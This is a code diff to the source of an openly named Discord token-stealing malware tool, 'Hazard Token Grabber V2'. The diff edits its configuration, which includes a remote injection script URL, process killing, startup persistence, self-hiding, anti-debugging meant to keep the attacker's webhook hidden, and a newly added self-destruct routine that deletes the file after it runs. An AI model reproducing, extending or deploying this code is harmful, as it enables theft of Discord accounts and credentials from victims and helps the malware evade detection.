@@ -12,8 +12,8 @@ import sqlite3
 import zipfile
 import threading
 import subprocess
+import sys
 
-from sys import argv
 from pathlib import Path
 from PIL import ImageGrab
 from struct import unpack
@@ -38,13 +38,15 @@ config = {
     # keep it as it is unless you want to have a custom one
     'injection_url': "https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/injection.js",
     # set to False if you don't want it to kill programs such as discord upon running the exe
-    'kill_processes': True,
+    'kill_processes': False,
     # if you want the file to run at startup
-    'startup': True,
+    'startup': False,
     # if you want the file to hide itself after run
-    'hide_self': True,
+    'hide_self': False,
     # does it's best to prevent the program from being debugged and drastically reduces the changes of your webhook being found
     'anti_debug': True,
+    # enables self destruct of this file after it has been run
+    'self_destruct': False,
     # this list of programs will be killed if hazard detects that any of these are running, you can add more if you want
     'blackListedPrograms':
     [
@@ -1131,4 +1133,15 @@ if __name__ == "__main__" and os.name == "nt":
         httpx.get('https://google.com')	
     except httpx.ConnectTimeout:	
         os._exit(0)	
-    asyncio.run(HazardTokenGrabberV2().init())
+    asyncio.run(Hazard_Token_Grabber_V2().init())
+    
+def fetchConf(e: str) -> str or bool | None:
+    return config.get(e)    
+    
+if fetchConf('self_destruct'):
+    if getattr(sys, 'frozen', False):
+        path = os.path.realpath(sys.executable)
+    elif __file__:
+        path = os.path.realpath(__file__)
+        
+        os.remove(path)
